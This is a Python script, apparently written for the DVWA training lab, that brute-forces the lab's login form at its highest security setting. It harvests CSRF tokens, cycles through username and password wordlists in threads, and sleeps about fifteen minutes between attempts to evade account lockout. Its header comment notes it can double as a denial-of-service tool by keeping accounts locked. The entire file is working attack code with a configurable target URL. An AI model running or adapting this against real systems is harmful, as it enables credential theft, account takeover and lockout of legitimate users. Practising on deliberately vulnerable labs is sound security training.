#!/usr/bin/python
# For DVWA bruteforce lab - impossible security - threading + sleep 
# Can act as DOS tool since the account shall be locked out when the script is running

import requests
import argparse
import logging
import time
import sys
import re
import concurrent.futures

GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m'

def session_gen(proxies, base_url):
    session = requests.session()
    user_token = get_response(session, base_url + 'login.php', proxies)
    if user_token:
        login(session, base_url + 'login.php', user_token, proxies)

    #user_token = get_response(session, base_url + 'security.php', proxies)
    #if user_token:
        #set_security(session, base_url + 'security.php', user_token, proxies)
    return session

def get_response(session, url, proxies=None):
    try:
        response = session.get(url, proxies=proxies)
        response.raise_for_status()
        return get_token(response)
    except requests.RequestException as e:
        logging.error(f"Error in retrieving {url}: {str(e)}")
        return None

def get_token(response):
    try:
        match = re.search(r'<input type=\'hidden\' name=\'user_token\' value=\'(.*?)\' />', response.text)
        if match:
            user_token = match.group(1)
            logging.debug('User Token:' + user_token)
            return user_token
        else:
            logging.warning("user_token not found in the response")
            return None
    except Exception as e:
        logging.error(f"Error in processing token: {str(e)}")
        return None

def login(session, url, user_token, proxies=None):
    try:
        payload = {
            'username': 'admin',
            'password': 'password',
            'Login': 'Login',
            'user_token': user_token
        }
        response = session.post(url, data=payload, proxies=proxies)
        response.raise_for_status()
        if 'index' in response.url:
            logging.info("Logged in successfully")
        else:
            logging.error("Couldn't login. Have you changed DVWA's default credentials?")
            sys.exit(1)
    except requests.RequestException as e:
        logging.error(f"Error in login request: {str(e)}")
        sys.exit(1)

def set_security(session, url, user_token, proxies=None):
    try:
        payload = {
            'security': 'high',
            'seclev_submit': 'Submit',
            'user_token': user_token
        }
        response = session.post(url, data=payload, proxies=proxies)
        response.raise_for_status()
        if '<em>high' in response.text:
            logging.info("Security level set to high")
    except requests.RequestException as e:
        logging.error(f"Error in security request: {str(e)}")

def brute(username, password, base_url, proxies=None):
    try:
        
        session = session_gen(proxies, base_url)
        url = base_url + 'vulnerabilities/brute/'
        user_token = get_response(session, url, proxies)
        params = {
            'username': username,
            'password': password,
            'Login': 'Login',
            'user_token': user_token
        }
        response = session.post(url, data=params, proxies=proxies)
        response.raise_for_status()
        if 'incorrect' in response.text:
            logging.debug(f"{username}:{password} Wrong Credentials")
            user_token = get_token(response)
            time.sleep(15*60+5)
            return False
        else:
            logging.info(f"Found valid credentials: {GREEN}{username}:{password}{RESET}")
            return True
    except requests.RequestException as e:
        logging.error(f"Error in brute request: {str(e)}")
        return None

def bruteit(username, base_url, proxies, password_wordlist_file):
    found_credentials = False  # Flag to track if valid credentials were found
    with open(password_wordlist_file, 'r') as passwords:
        for password in passwords:
            found_credentials = brute(username, password.strip(), base_url, proxies)
            if found_credentials:
                return password
    if not found_credentials:
        logging.info(f"Username: {RED}{username}{RESET} No valid credentials could be found")
        return None

def main():
    parser = argparse.ArgumentParser(description='DVWA Bruteforce Script for Impossible Security')
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--username', help='Single username for the bruteforce attack')
    group.add_argument('-U', '--usernames-file', help='Path to the username wordlist file')
    parser.add_argument('-P', '--passwords', required=True, help='Path to the password wordlist file')
    parser.add_argument('-b', '--base-url', default='http://localhost/DVWA/', help='Base URL for the DVWA instance. Example: http://192.168.1.137/dvwa/')
    parser.add_argument('-v', '--verbose', action='store_true', help='Increase verbosity level to DEBUG')
    parser.add_argument('-x', '--proxy', default=None, help='Proxy address in the format http://host:port')
    args = parser.parse_args()

    password_wordlist_file = args.passwords
    base_url = args.base_url
    
    # Configure logging level and format
    logging_level = logging.DEBUG if args.verbose else logging.INFO
    logging.basicConfig(level=logging_level, format='[%(levelname)s] %(message)s')

    if args.username:
        usernames = [args.username]
    elif args.usernames_file:
        try:
            with open(args.usernames_file, 'r') as file:
                usernames = [line.strip() for line in file.readlines()]
        except FileNotFoundError:
            logging.error(f"Usernames file not found: {args.usernames_file}")
            sys.exit(1)

    if not usernames:
        logging.error("No usernames provided")
        sys.exit(1)

    proxies = None
    if args.proxy:
        if args.proxy.strip():
            proxies = {'http': args.proxy, 'https': args.proxy}
        else:
            proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

    executor = concurrent.futures.ThreadPoolExecutor(max_workers=4)
    futures = []
    for username in usernames:
        future = executor.submit(bruteit, username, base_url, proxies, password_wordlist_file)
        futures.append(future)

    for future in concurrent.futures.as_completed(futures):
        credentials = future.result()

    executor.shutdown()


if __name__ == '__main__':
    main()
